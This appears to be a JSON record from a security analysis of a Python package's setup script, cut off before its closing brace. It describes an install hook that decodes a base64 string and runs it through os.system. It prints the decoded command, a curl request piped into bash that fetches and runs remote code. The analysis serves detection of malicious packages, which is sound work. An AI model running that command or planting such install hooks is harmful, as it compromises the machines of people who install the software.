{
  "purpose": "Setup script for a Python package that executes a base64-decoded command upon installation or development setup.",
  "sources": "The function b64d which decodes base64-encoded data; the call to notmalfunc() in AfterInstall.run() which executes os.system with decoded string.",
  "sinks": "os.system() call executing the decoded command; the decoded command runs an HTTP request using curl.",
  "flows": "During install or develop command, the base64 string is decoded and passed to os.system, leading to an HTTP request being executed.",
  "anomalies": "Use of base64 decoding to obfuscate a command that performs an HTTP request; the command is hardcoded and obfuscated, suggesting an attempt to conceal malicious activity.",
  "analysis": "The script defines functions to decode a base64-encoded string and executes it during installation. The decoded command is 'curl -s http://192.168.1.3:8000/test.txt | bash', which fetches and executes remote code. The obfuscation via base64 encoding indicates an attempt to hide malicious intent. The package setup includes a malicious side effect in the install process, which is executed automatically upon installation. No other suspicious third-party library use or obfuscated bytecode present. The code is straightforward in executing a remote script during installation, which is a security risk.",
  "conclusion": "The code contains malicious behavior by executing a remote command during installation, likely to download and run malicious code from an external server. This indicates a high security risk and malicious intent.",
